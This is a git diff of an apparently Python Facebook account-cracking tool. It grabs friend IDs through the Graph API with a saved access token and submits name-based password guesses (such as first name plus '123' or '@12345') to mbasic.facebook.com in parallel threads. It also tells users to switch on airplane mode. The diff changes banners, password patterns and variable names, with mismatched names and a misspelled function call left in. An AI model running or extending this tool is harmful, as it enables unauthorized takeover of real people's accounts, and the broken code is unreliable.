@@ -71,18 +71,21 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo =                                          """                                      
-__     _____  _______ _   _     _  _     _  _     _  _ 
-\ \   / (_\ \/ |____ | | / |   | || |   | || |   | || |
- \ \ / /| |\  /  |_  | |/  |  _| || |  _| || |  _| || |
-  \ V / | |/  \ ___| |  /| | |_   __| |_   __| |_   __|
-   \_/  |_/_/\_|_____|_/ |_|   |_|      |_|      |_|   
-                                                        
+logo =                                          """   
+ 
+ _     _ ___  _ _____ _      _        _ 
+/ \ |\/ \\  \///  __// \  /|/ \ |\/\ / |
+| | //| | \  / |  \  | |\ ||| | //\_\| |
+| \// | | /  \ |  /_ | | \||| \//    | |
+\__/  \_//__/\\\____\\_/  \|\__/     \_|
+                                        
+
+                                                
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m ᴏᴡɴᴇʀ \x1b[1;97m : \033[1;37m           ᴠɪxᴇɴ 4 4 4 (Roshan)
-\033[1;31m\033[1;37m ғᴀᴄᴇʙᴏᴏᴋ\x1b[1;97m:  \033[1;37m       Roshan T. Tamang
+\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           ᴠɪxᴇɴ 444
+\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m       Roshan T.Tamang
 \033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           RoshanDona
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m           4.0.7
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             7.0.1
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
@@ -102,7 +105,7 @@ def sarfraz():
     IP = ipm['origin']
     print
     print(' [1] Start File Cloning')
-    print(' [2] Create File')
+    print(' [2] Coming soon..')
     print(' [E] exit ')
     print('')
     _sarfraz___ = input(' [?] Choose option : ')
@@ -232,7 +235,7 @@ class __xxx__:
         elif chi in ('1', '01'):
             os.system("clear")
             print(logo)
-            print("\033[1;31m\rᴄᴘ ɪᴅ 20% ʟᴏɢɪɴ\033[1;37m")
+            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
             print(47*"-")
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
@@ -250,7 +253,7 @@ class __xxx__:
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                         else:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"@12345", xz[0]+"@123"]
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                         VIXENworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
@@ -264,10 +267,9 @@ class __xxx__:
             p2 = input('  Name + 2 : ')
             p3 = input('  Name + 3 : ')
             p4 = input('  Name + 4 : ')
-            p1 = input('  Name + 5 : ')
             os.system("clear")
             print(logo)
-            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
+            print("\033[1;31m\rcp id login 20%\033[1;37m")
             print(47*"-")
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
@@ -279,9 +281,8 @@ class __xxx__:
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+                            pwx = [name, xz[0]+"@123", xz[0]+xz[1], xz[0]+"@12345"]
                         VIXENworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
@@ -327,7 +328,7 @@ def manual():
     print('  Name: '+uname)
     print(50*'-')
     limit = int(input('  How many ids do you want to add ? '))
-    save_file = input('  Save file as: ')
+    VIXENv5 = input('  Save file as: ')
     t = 0
     for u in range(limit):
         t+=1
@@ -343,13 +344,13 @@ def manual():
                     last_name = names.split(' ')[1]
                 except:
                     last_name = 'Khan'
-                with open('/sdcard/'+save_file, 'a') as rd:
+                with open('/sdcard/'+VIXENv5, 'a') as rd:
                     rd.write(uids+'|'+first_name+'|'+last_name+'\n')
         except KeyError:
             print('  No friend for '+ids)
             pass
     print(50*'-')
-    print('  Ids saved as: '+save_file)
+    print('  Ids saved as: '+VIXENv5)
     print(50*'-')
     input(' Press enter to back')
     sarfraz()
@@ -412,7 +413,7 @@ def auto():
         completed +=1
         li = input('  %s Link start with: '%completed)
         os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
-    save_file = input('  Save file as: ')
+    VIXENv5 = input('  Save file as: ')
     os.system('clear')
     lines = open('temp2.txt', 'r').readlines()
     print(logo)
@@ -427,7 +428,7 @@ def auto():
             tfile = open('/sdcard/tokenofl.txt','r').read()
             rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
             rgq = json.loads(rg)
-            idsave=open('/sdcard/'+VIXENv7, 'a')
+            idsave=open('/sdcard/'+VIXENv4, 'a')
             for inayat in rgq['data']:
                 uids = inayat['id']
                 dill.append(uids)
@@ -456,11 +457,11 @@ def auto():
                 print(50*'-')
                 os.system('rm -rf temp*')
                 pass
-    lenid = open('/sdcard/'+save_file, 'r').readlines()
+    lenid = open('/sdcard/'+VIXENv4, 'r').readlines()
     print('  Grabbing Process has completed ')
     os.system('rm -rf temp*')
     print('  Total ids grabbed: '+str(len(lenid)))
-    print('  File saved as: /sdcard/'+save_file)
+    print('  File saved as: /sdcard/'+VIXENv4)
     print(50*'-')
     input('  Press enter to back ')
     safraz()
